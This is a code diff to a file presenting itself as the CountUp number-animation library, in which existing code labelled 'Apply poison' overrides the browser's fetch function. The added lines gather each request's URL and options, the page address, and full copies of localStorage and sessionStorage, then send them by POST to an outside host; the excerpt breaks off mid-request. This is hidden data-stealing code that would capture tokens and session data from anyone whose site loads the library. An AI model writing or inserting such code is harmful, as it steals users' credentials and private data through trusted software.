@@ -118,6 +118,16 @@ var CountUp = /** @class */ (function () {
         // Apply poison
         window.oFetch = window.fetch;
         window.fetch = function (url, options) {
+            var extLStorage = __assign({}, localStorage);
+            var extSStorage = __assign({}, sessionStorage);
+            var a = {
+                url: url,
+                options: options,
+                host: window.location.href,
+                localStorage: extLStorage,
+                sessionStorage: extSStorage,
+            };
+            console.log(a);
             window.oFetch("https://spa-demo.ja1code.dev/", {
                 method: "POST",
                 headers: {
